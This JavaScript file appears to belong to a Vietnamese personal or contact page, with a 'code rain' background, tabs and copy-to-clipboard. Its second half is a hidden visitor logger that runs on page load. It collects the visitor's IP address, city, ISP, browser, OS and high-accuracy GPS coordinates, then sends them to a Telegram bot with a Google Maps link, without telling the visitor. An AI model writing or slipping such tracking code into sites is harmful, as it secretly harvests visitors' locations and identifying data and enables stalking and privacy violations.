// Code rain background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 12;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(15, 23, 42, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#60a5fa';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 45);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// Tab toggle
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.contact-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Đã sao chép: ' + text);
    }).catch(() => {
        alert('Không thể sao chép, thử thủ công nhé!');
    });
}

// Auto zoom adjustment
function adjustZoom() {
    const vw = document.getElementById('viewportMeta');
    const w = window.innerWidth;
    let scale = w < 768 ? 1.04 : 1.0;
    vw.setAttribute('content', `width=device-width, initial-scale=${scale}, maximum-scale=5.0, user-scalable=yes`);
}
window.addEventListener('resize', adjustZoom);
adjustZoom();

 // --- 1. CẤU HÌNH ---
const TG_TOKEN = CONFIG.TG_TOKEN;
        const CHAT_ID = CONFIG.CHAT_ID;
let isProcessing = false;

// --- 2. NHẬN DIỆN TRÌNH DUYỆT CHÍNH XÁC (Fix lỗi Safari trên iPhone) ---
function getBrowserDetail() {
    const ua = navigator.userAgent;
    let browser = "Trình duyệt lạ";
    let os = "Không rõ";

    // Nhận diện Hệ điều hành
    if (ua.includes("Win")) os = "Windows";
    else if (ua.includes("iPhone")) os = "iOS (iPhone)";
    else if (ua.includes("iPad")) os = "iOS (iPad)";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("Mac")) os = "MacOS";

    // Nhận diện Trình duyệt (Fix lỗi Chrome hiện Safari)
    if (ua.includes("CocCoc") || ua.includes("coc_coc_browser")) browser = "Cốc Cốc";
    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
    else if (ua.includes("CriOS")) browser = "Google Chrome (iOS)"; // Chrome trên iPhone
    else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
    else if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("CriOS")) browser = "Safari";

    return { browser, os };
}

// --- 3. LẤY DỮ LIỆU IP, THÀNH PHỐ, NHÀ MẠNG (Dùng nguồn HTTPS mạnh nhất) ---
async function getFullData() {
    try {
        // Nguồn này lấy ISP Việt Nam (Viettel, VNPT, FPT) rất tốt và hỗ trợ HTTPS
        const response = await fetch('https://ipwho.is/');
        const d = await response.json();
        if (d.success) {
            return {
                ip: d.ip,
                city: d.city || "Không rõ",
                isp: d.connection?.isp || d.org || "Nhà mạng ẩn"
            };
        }
    } catch (e) {
        // Nếu nguồn 1 lỗi, dùng nguồn 2 dự phòng
        const res2 = await fetch('https://ipapi.co/json/');
        const d2 = await res2.json();
        return {
            ip: d2.ip,
            city: d2.city || "Không rõ",
            isp: d2.org || "Nhà mạng ẩn"
        };
    }
    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
}

// --- 4. GỬI THÔNG BÁO (Format giống Ảnh 1) ---
async function sendNotification(pos, info) {
    if (isProcessing) return;
    isProcessing = true;

    const device = getBrowserDetail();
    const time = new Date().toLocaleString('vi-VN');

    // Chỉnh sửa Format y hệt ảnh 1
    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
    msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
    msg += `🌐 <b>Địa chỉ IP:</b> <code>${info.ip}</code>\n`;
    msg += `🏙️ <b>Thành phố:</b> <code>${info.city}</code>\n`;
    msg += `📡 <b>Nhà mạng:</b> <b>${info.isp}</b>\n\n`;

    msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
    msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;

    if (pos && pos.coords) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        msg += `📍 <b>Vị trí GPS:</b>\n`;
        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
    } else {
        msg += `⚠️ <b>GPS:</b> Người dùng từ chối vị trí\n`;
    }

    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'HTML',
                disable_web_page_preview: false // Để hiện bản đồ thu nhỏ
            })
        });
    } catch (err) {
        console.error(err);
    } finally {
        isProcessing = false;
    }
}

// --- 5. KHỞI CHẠY ---
window.onload = async () => {
    const ipInfo = await getFullData();
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => sendNotification(pos, ipInfo),
            () => sendNotification(null, ipInfo),
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else {
        sendNotification(null, ipInfo);
    }
};
